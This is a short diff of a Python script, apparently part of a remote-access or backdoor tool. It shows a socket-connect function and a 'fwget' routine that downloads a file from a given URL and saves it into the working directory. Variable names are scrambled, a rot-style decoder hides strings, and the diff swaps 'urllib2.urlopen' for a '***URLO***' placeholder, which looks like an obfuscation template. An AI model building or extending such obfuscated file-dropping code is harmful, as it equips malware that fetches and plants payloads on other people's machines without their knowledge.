@@ -34,7 +34,7 @@ def fconnect():
 	s.settimeout(999)
 	pwd = os.getcwd()
 def fwget(l2cHJm):
-	down = urllib2.urlopen(l2cHJm)
+	down = ***URLO***(l2cHJm)
 	filename = l2cHJm.split('/')[-1]
 	with open(pwd.strip(funrot("EAs")) + sepvar + filename,'wb') as o:
 		o.write(down.read())
